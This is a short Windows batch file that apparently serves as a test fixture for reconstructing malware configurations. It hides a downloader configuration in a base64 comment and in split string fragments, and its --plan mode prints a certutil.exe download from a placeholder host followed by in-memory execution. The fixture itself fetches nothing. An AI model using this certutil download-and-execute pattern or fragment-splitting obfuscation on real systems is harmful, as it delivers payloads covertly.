@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:split_fragments|identity
rem HUNTRESS-MATERIAL:dj0xfHN0ZXBzPWFjcXVpcmVfcmVtb3RlLGRpc3BhdGNoX21lbW9yeXxhZGFwdGVyPWNlcnR1dGlsLmV4ZXxzdGFnZV9jb3VudD0xfGdyYXBoPWRpYW1vbmR8bmV4dF9sYW5ndWFnZT1ub25lfGNhbXBhaWduX2lkPWNhbXBhaWduLWQ2NmY4ZDQ5MTR8dXJsPWh0dHBzOi8vZDY2ZjhkNDkxNC5leGFtcGxlLmludmFsaWQvY2UzOWE2ZGYuZGF0
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "fragment0=v=1|steps=acquire_remote,dispatch_memory|adapter"
set "fragment1==certutil.exe|stage_count=1|graph=diamond|next_l"
set "fragment2=anguage=none|campaign_id=campaign-d66f8d4914|url"
set "fragment3==https://d66f8d4914.example.invalid/ce39a6df.dat"
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
ver >nul
if errorlevel 1 exit /b 1
call set "recovered_configuration=%%fragment0%%%%fragment1%%%%fragment2%%%%fragment3%%"
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_PLAN
echo certutil.exe GET https://d66f8d4914.example.invalid/ce39a6df.dat then dispatch memory
exit /b 0
